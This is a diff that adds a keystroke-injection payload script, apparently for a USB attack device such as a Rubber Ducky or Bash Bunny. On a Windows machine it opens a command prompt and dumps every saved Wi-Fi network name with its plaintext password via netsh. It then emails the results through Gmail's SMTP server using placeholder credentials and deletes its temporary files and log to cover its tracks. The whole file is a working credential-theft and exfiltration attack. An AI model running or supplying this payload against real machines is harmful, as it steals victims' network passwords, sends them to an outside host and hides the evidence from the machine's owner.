@@ -1,0 +1,58 @@
+LED 100 100 100
+DELAY 4000
+REM --> Open cmd
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 200
+REM --> Get all SSID
+LED 255 0 0
+STRING cd %USERPROFILE% & netsh wlan show profiles | findstr "All" > a.txt
+ENTER
+REM --> Create a filter.bat to get all the profile names
+STRING echo setlocal enabledelayedexpansion^
+ENTER
+ENTER
+STRING for /f "tokens=5*" %%i in (a.txt) do (^
+ENTER
+ENTER
+STRING set val=%%i %%j^
+ENTER
+ENTER
+STRING if "!val:~-1!" == " " set val=!val:~0,-1!^
+ENTER
+ENTER
+STRING echo !val!^>^>b.txt) > filter.bat
+ENTER
+REM --> Run filter.bat and save all profile names in b.txt
+STRING filter.bat
+DELAY 300
+ENTER
+REM --> Save all the stuff in Log and delete the temp files
+STRING (for /f "tokens=*" %i in (b.txt) do @echo     SSID: %i & netsh wlan show profiles name="%i" key=clear | findstr /c:"Key Content" & echo.) > Log.txt
+ENTER
+DELAY 1000
+STRING del a.txt b.txt filter.bat
+ENTER
+REM --> Mail Log.txt
+STRING powershell
+ENTER
+DELAY 1000
+STRING $from = 'SENDER EMAIL'
+ENTER
+STRING $pass = ConvertTo-SecureString 'SENDER PASSWORD' -AsPlainText -Force
+ENTER
+STRING $cred = New-Object System.Management.Automation.PSCredential ($from, $pass)
+ENTER
+STRING Send-MailMessage -From $from -To 'RECIPIENT EMAIL' -Subject 'W' -Body (Get-Content Log.txt | out-string) -SmtpServer 'smtp.gmail.com' -Port 587 -Credential $cred -UseSsl
+ENTER
+LED 100 100 100
+DELAY 1000
+STRING exit
+ENTER
+DELAY 500
+REM --> Delete Log.txt and exit
+STRING del Log.txt & exit
+ENTER
+LED 0 0 0
